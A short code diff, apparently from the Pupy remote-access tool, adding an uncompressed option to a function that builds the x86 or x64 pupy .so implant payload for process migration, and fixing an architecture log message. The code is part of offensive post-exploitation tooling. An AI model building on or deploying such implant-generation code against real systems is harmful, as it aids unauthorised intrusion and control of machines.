@@ -17,13 +17,16 @@ def has_proc_migrated(client, pid):
                 return c
     return None
 
-def get_payload(module):
+def get_payload(module, compressed=True):
     if module.client.is_proc_arch_64_bits():
         module.info('Generate pupyx64.so payload')
         dllbuf = pupygen.get_edit_pupyx64_so(module.client.get_conf())
     else:
-        module.info('Generate pupyx64.so payload')
+        module.info('Generate pupyx86.so payload')
         dllbuf = pupygen.get_edit_pupyx86_so(module.client.get_conf())
+
+    if not compressed:
+        return dllbuf
 
     dllgzbuf = cStringIO.StringIO()
     gzf = gzip.GzipFile('pupy.so', 'wb', 9, dllgzbuf)
